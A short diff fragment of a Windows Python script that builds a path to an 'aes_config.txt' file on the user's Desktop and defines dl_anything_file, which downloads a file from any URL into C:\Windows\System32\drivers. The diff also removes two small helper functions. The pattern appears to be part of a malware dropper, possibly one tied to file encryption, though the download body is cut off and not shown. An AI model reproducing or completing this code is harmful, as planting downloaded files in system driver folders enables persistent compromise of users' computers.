@@ -9,11 +9,7 @@ import subprocess
 import os
 desktop_pathxsd = os.path.join(os.environ['USERPROFILE'], 'Desktop')
 file_pathaesconfig = os.path.join(desktop_pathxsd, 'aes_config.txt')
-def get_pt(n1, n2, perc):
-    return n1 + ((n2 - n1) * perc)
 
-def get_rnd(min_val, max_val):
-    return random.randint(min_val, max_val - 1)
 def dl_anything_file(url, file_name):
     target_directory = r'C:\Windows\System32\drivers'
     save_path = os.path.join(target_directory, file_name)
